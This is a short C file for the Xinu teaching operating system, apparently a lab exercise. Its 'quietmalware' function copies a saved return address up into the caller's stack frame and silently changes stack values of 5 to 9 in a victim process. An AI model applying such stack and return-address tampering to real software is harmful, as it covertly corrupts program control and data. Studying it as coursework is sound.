/* quietmalware.c - quietmalware */

#include <xinu.h>

void quietmalware(void) {
  struct procent *prptr;
  long *ebp;
  long *saddr;
  long retaddr;
  /* currpid is now the victimpid */

  prptr = &proctab[getpid()];


  /* Get the intended return address from the stack */
  retaddr = *(( (long *) prptr->prstkptr) - 1);

  /* Overwrite the existing return address to be the retaddr */
  saddr = (long *) prptr->prstkptr;
  ebp = saddr + 2;
  saddr = (long *)(*ebp);
  *++saddr = retaddr;

  for (; saddr < (long *)(*ebp) + 50; saddr++) {
    if ((*saddr) == 5)
      *saddr = 9;
  }

}

